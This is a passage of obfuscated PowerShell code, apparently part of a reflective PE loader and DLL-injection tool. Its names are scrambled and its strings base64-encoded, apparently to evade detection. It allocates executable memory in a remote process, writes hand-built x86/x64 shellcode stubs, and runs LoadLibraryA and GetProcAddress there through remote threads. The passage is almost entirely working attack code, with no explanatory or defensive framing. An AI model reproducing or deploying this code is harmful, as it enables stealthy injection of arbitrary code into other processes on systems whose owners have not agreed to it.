			${_/\/\__/=\/\/=\_/} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${_/\/\__/=\/\/=\_/}
	}
	Function ___/=\_/==\_/\____
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${_/=====\_/=\/\___/} = New-Object System.Object
		[IntPtr]${___/\/\/==\/=====} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, ${___/\/\/==\/=====}, $PEBytes.Length) | Out-Null
		${_/\/\__/=\/\/=\_/} = __/===\_/\/\/=\/\_ -__/=\____/\_/\/\_/ ${___/\/\/==\/=====} -Win32Types $Win32Types
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${_/\/\__/=\/\/=\_/}.PE64Bit)
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${_/\/\__/=\/\/=\_/}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${_/\/\__/=\/\/=\_/}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${_/\/\__/=\/\/=\_/}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${_/\/\__/=\/\/=\_/}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${___/\/\/==\/=====})
		return ${_/=====\_/=\/\___/}
	}
	Function ____/=\_/\/====\_/
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/=\____/\_/\/\_/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		if (${__/=\____/\_/\/\_/} -eq $null -or ${__/=\____/\_/\/\_/} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
		}
		${_/=====\_/=\/\___/} = New-Object System.Object
		${_/\/\__/=\/\/=\_/} = __/===\_/\/\/=\/\_ -__/=\____/\_/\/\_/ ${__/=\____/\_/\/\_/} -Win32Types $Win32Types
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${__/=\____/\_/\/\_/}
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${_/\/\__/=\/\/=\_/}.IMAGE_NT_HEADERS)
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${_/\/\__/=\/\/=\_/}.NtHeadersPtr)
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${_/\/\__/=\/\/=\_/}.PE64Bit)
		${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${_/\/\__/=\/\/=\_/}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${_/=====\_/=\/\___/}.PE64Bit -eq $true)
		{
			[IntPtr]${/=\_/==\/=\__/===} = [IntPtr](____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${/=\_/==\/=\__/===}
		}
		else
		{
			[IntPtr]${/=\_/==\/=\__/===} = [IntPtr](____/\____/====\/= ([Int64]${_/=====\_/=\/\___/}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${/=\_/==\/=\__/===}
		}
		if ((${_/\/\__/=\/\/=\_/}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
		}
		elseif ((${_/\/\__/=\/\/=\_/}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${_/=====\_/=\/\___/} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
		}
		return ${_/=====\_/=\/\___/}
	}
	Function __/\/=\/======\___
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\_/\__/\/\__/\/},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${__/\/=\_/=\/\_/==\}
		)
		${/=\/==\___/=\/\_/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${_/===\_/==\/=====} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/\/=\_/=\/\_/==\})
		${/=\/=\_/=\_/=\/\/} = [UIntPtr][UInt64]([UInt64]${_/===\_/==\/=====}.Length + 1)
		${/=\_/=\_/=\_/=\/=} = $Win32Functions.VirtualAllocEx.Invoke(${__/\_/\__/\/\__/\/}, [IntPtr]::Zero, ${/=\/=\_/=\_/=\/\/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${/=\_/=\_/=\_/=\/=} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${_/=\/==\_/\______} = [UIntPtr]::Zero
		${_/\_/\__/\/=\/\/\} = $Win32Functions.WriteProcessMemory.Invoke(${__/\_/\__/\/\__/\/}, ${/=\_/=\_/=\_/=\/=}, ${__/\/=\_/=\/\_/==\}, ${/=\/=\_/=\_/=\/\/}, [Ref]${_/=\/==\_/\______})
		if (${_/\_/\__/\/=\/\/\} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${/=\/=\_/=\_/=\/\/} -ne ${_/=\/==\_/\______})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${___/\___/\___/\__} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${_/=\/=========\/=} = $Win32Functions.GetProcAddress.Invoke(${___/\___/\___/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
		[IntPtr]${___/===\_/\/=\_/=} = [IntPtr]::Zero
		if (${_/=====\_/=\/\___/}.PE64Bit -eq $true)
		{
			${__/\/=====\_/=\/\} = $Win32Functions.VirtualAllocEx.Invoke(${__/\_/\__/\/\__/\/}, [IntPtr]::Zero, ${/=\/=\_/=\_/=\/\/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if (${__/\/=====\_/=\/\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
			}
			${_/=\_________/\/=} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${__/\/=\/\/\_/==\/} = @(0x48, 0xba)
			${/=\/===\___/\/=\/} = @(0xff, 0xd2, 0x48, 0xba)
			${____/=\/\__/====\} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${/=\/\/=\/===\____} = ${_/=\_________/\/=}.Length + ${__/\/=\/\/\_/==\/}.Length + ${/=\/===\___/\/=\/}.Length + ${____/=\/\__/====\}.Length + (${/=\/==\___/=\/\_/} * 3)
			${_/==\/\/\/\/==\__} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\/\/=\/===\____})
			${_/\__/\_/=\___/\/} = ${_/==\/\/\/\/==\__}
			__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${_/=\_________/\/=} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
			${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${_/=\_________/\/=}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\_/=\_/=\_/=\/=}, ${_/==\/\/\/\/==\__}, $false)
			${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/==\___/=\/\_/})
			__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${__/\/=\/\/\_/==\/} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
			${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${__/\/=\/\/\_/==\/}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\/=========\/=}, ${_/==\/\/\/\/==\__}, $false)
			${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/==\___/=\/\_/})
			__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${/=\/===\___/\/=\/} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
			${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/===\___/\/=\/}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\/=====\_/=\/\}, ${_/==\/\/\/\/==\__}, $false)
			${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/==\___/=\/\_/})
			__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${____/=\/\__/====\} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
			${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${____/=\/\__/====\}.Length)
			${__/\/\/=\__/=\/==} = $Win32Functions.VirtualAllocEx.Invoke(${__/\_/\__/\/\__/\/}, [IntPtr]::Zero, [UIntPtr][UInt64]${/=\/\/=\/===\____}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${__/\/\/=\__/=\/==} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
			}
			${_/\_/\__/\/=\/\/\} = $Win32Functions.WriteProcessMemory.Invoke(${__/\_/\__/\/\__/\/}, ${__/\/\/=\__/=\/==}, ${_/\__/\_/=\___/\/}, [UIntPtr][UInt64]${/=\/\/=\/===\____}, [Ref]${_/=\/==\_/\______})
			if ((${_/\_/\__/\/=\/\/\} -eq $false) -or ([UInt64]${_/=\/==\_/\______} -ne [UInt64]${/=\/\/=\/===\____}))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
			${_/\/=\_/==\_/\___} = _/===\_/\_/\/==\_/ -___/=\/=\/====\___ ${__/\_/\__/\/\__/\/} -_/==\__/=\_/=\/\_/ ${__/\/\/=\__/=\/==} -Win32Functions $Win32Functions
			${_/==\/=\__/\___/\} = $Win32Functions.WaitForSingleObject.Invoke(${_/\/=\_/==\_/\___}, 20000)
			if (${_/==\/=\__/\___/\} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[IntPtr]${___/=\/=\______/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\/==\___/=\/\_/})
			${_/==\/=\__/\___/\} = $Win32Functions.ReadProcessMemory.Invoke(${__/\_/\__/\/\__/\/}, ${__/\/=====\_/=\/\}, ${___/=\/=\______/=}, [UIntPtr][UInt64]${/=\/==\___/=\/\_/}, [Ref]${_/=\/==\_/\______})
			if (${_/==\/=\__/\___/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${___/===\_/\/=\_/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/=\/=\______/=}, [Type][IntPtr])
			$Win32Functions.VirtualFreeEx.Invoke(${__/\_/\__/\/\__/\/}, ${__/\/=====\_/=\/\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke(${__/\_/\__/\/\__/\/}, ${__/\/\/=\__/=\/==}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${_/\/=\_/==\_/\___} = _/===\_/\_/\/==\_/ -___/=\/=\/====\___ ${__/\_/\__/\/\__/\/} -_/==\__/=\_/=\/\_/ ${_/=\/=========\/=} -_/=\_/\/==\__/\/\/ ${/=\_/=\_/=\_/=\/=} -Win32Functions $Win32Functions
			${_/==\/=\__/\___/\} = $Win32Functions.WaitForSingleObject.Invoke(${_/\/=\_/==\_/\___}, 20000)
			if (${_/==\/=\__/\___/\} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[Int32]${/=\/=\/=====\/=\_} = 0
			${_/==\/=\__/\___/\} = $Win32Functions.GetExitCodeThread.Invoke(${_/\/=\_/==\_/\___}, [Ref]${/=\/=\/=====\/=\_})
			if ((${_/==\/=\__/\___/\} -eq 0) -or (${/=\/=\/=====\/=\_} -eq 0))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${___/===\_/\/=\_/=} = [IntPtr]${/=\/=\/=====\/=\_}
		}
		$Win32Functions.VirtualFreeEx.Invoke(${__/\_/\__/\/\__/\/}, ${/=\_/=\_/=\_/=\/=}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		return ${___/===\_/\/=\_/=}
	}
	Function __/\/==\/\___/====
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\_/\__/\/\__/\/},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${___/\/====\_/\___/},
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		${___/\_____/=\/=\/\},
        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        ${____/==\__/=\__/\/}
		)
		${/=\/==\___/=\/\_/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[IntPtr]${/==\__/=\/\/\/=\/} = [IntPtr]::Zero   
        if (-not ${____/==\__/=\__/\/})
        {
        	${_/\_________/\_/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${___/\_____/=\/=\/\})
		    ${___/====\/\__/\/\} = [UIntPtr][UInt64]([UInt64]${_/\_________/\_/\/}.Length + 1)
		    ${/==\__/=\/\/\/=\/} = $Win32Functions.VirtualAllocEx.Invoke(${__/\_/\__/\/\__/\/}, [IntPtr]::Zero, ${___/====\/\__/\/\}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if (${/==\__/=\/\/\/=\/} -eq [IntPtr]::Zero)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		    }
		    [UIntPtr]${_/=\/==\_/\______} = [UIntPtr]::Zero
		    ${_/\_/\__/\/=\/\/\} = $Win32Functions.WriteProcessMemory.Invoke(${__/\_/\__/\/\__/\/}, ${/==\__/=\/\/\/=\/}, ${___/\_____/=\/=\/\}, ${___/====\/\__/\/\}, [Ref]${_/=\/==\_/\______})
		    if (${_/\_/\__/\/=\/\/\} -eq $false)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		    }
		    if (${___/====\/\__/\/\} -ne ${_/=\/==\_/\______})
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		    }
        }
        else
        {
            ${/==\__/=\/\/\/=\/} = ${___/\_____/=\/=\/\}
        }
		${___/\___/\___/\__} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${_/\__/==\/===\_/=} = $Win32Functions.GetProcAddress.Invoke(${___/\___/\___/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) 
		${/=\__/=\___/\/\_/} = $Win32Functions.VirtualAllocEx.Invoke(${__/\_/\__/\/\__/\/}, [IntPtr]::Zero, [UInt64][UInt64]${/=\/==\___/=\/\_/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${/=\__/=\___/\/\_/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))
		}
		[Byte[]]${_/\/======\__/\/\} = @()
		if (${_/=====\_/=\/\___/}.PE64Bit -eq $true)
		{
			${_/\____/===\_/\/=} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${__/=\/\___/=\/\/\} = @(0x48, 0xba)
			${/=\/\_/\/\__/\/\_} = @(0x48, 0xb8)
			${/=\_/============} = @(0xff, 0xd0, 0x48, 0xb9)
			${__/\/\_/=\/\____/} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${_/\____/===\_/\/=} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${__/=\/\___/=\/\/\} = @(0xb9)
			${/=\/\_/\/\__/\/\_} = @(0x51, 0x50, 0xb8)
			${/=\_/============} = @(0xff, 0xd0, 0xb9)
			${__/\/\_/=\/\____/} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${/=\/\/=\/===\____} = ${_/\____/===\_/\/=}.Length + ${__/=\/\___/=\/\/\}.Length + ${/=\/\_/\/\__/\/\_}.Length + ${/=\_/============}.Length + ${__/\/\_/=\/\____/}.Length + (${/=\/==\___/=\/\_/} * 4)
		${_/==\/\/\/\/==\__} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\/\/=\/===\____})
		${_/\__/\_/=\___/\/} = ${_/==\/\/\/\/==\__}
		__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${_/\____/===\_/\/=} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
		${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${_/\____/===\_/\/=}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/\/====\_/\___/}, ${_/==\/\/\/\/==\__}, $false)
		${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/==\___/=\/\_/})
		__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${__/=\/\___/=\/\/\} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
		${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${__/=\/\___/=\/\/\}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/==\__/=\/\/\/=\/}, ${_/==\/\/\/\/==\__}, $false)
		${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/==\___/=\/\_/})
		__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${/=\/\_/\/\__/\/\_} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
		${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/\_/\/\__/\/\_}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\__/==\/===\_/=}, ${_/==\/\/\/\/==\__}, $false)
		${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/==\___/=\/\_/})
		__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${/=\_/============} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
		${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\_/============}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\__/=\___/\/\_/}, ${_/==\/\/\/\/==\__}, $false)
		${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${/=\/==\___/=\/\_/})
		__/\/\/===\__/==\/ -_/=\/=\_/\_____/=\ ${__/\/\_/=\/\____/} -__/\/\/\__/\_/\/\_ ${_/==\/\/\/\/==\__}
		${_/==\/\/\/\/==\__} = ____/\____/====\/= ${_/==\/\/\/\/==\__} (${__/\/\_/=\/\____/}.Length)
		${__/\/\/=\__/=\/==} = $Win32Functions.VirtualAllocEx.Invoke(${__/\_/\__/\/\__/\/}, [IntPtr]::Zero, [UIntPtr][UInt64]${/=\/\/=\/===\____}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if (${__/\/\/=\__/=\/==} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
		}
		[UIntPtr]${_/=\/==\_/\______} = [UIntPtr]::Zero
		${_/\_/\__/\/=\/\/\} = $Win32Functions.WriteProcessMemory.Invoke(${__/\_/\__/\/\__/\/}, ${__/\/\/=\__/=\/==}, ${_/\__/\_/=\___/\/}, [UIntPtr][UInt64]${/=\/\/=\/===\____}, [Ref]${_/=\/==\_/\______})
		if ((${_/\_/\__/\/=\/\/\} -eq $false) -or ([UInt64]${_/=\/==\_/\______} -ne [UInt64]${/=\/\/=\/===\____}))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
		}
		${_/\/=\_/==\_/\___} = _/===\_/\_/\/==\_/ -___/=\/=\/====\___ ${__/\_/\__/\/\__/\/} -_/==\__/=\_/=\/\_/ ${__/\/\/=\__/=\/==} -Win32Functions $Win32Functions
		${_/==\/=\__/\___/\} = $Win32Functions.WaitForSingleObject.Invoke(${_/\/=\_/==\_/\___}, 20000)
		if (${_/==\/=\__/\___/\} -ne 0)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
		}
		[IntPtr]${___/=\/=\______/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=\/==\___/=\/\_/})
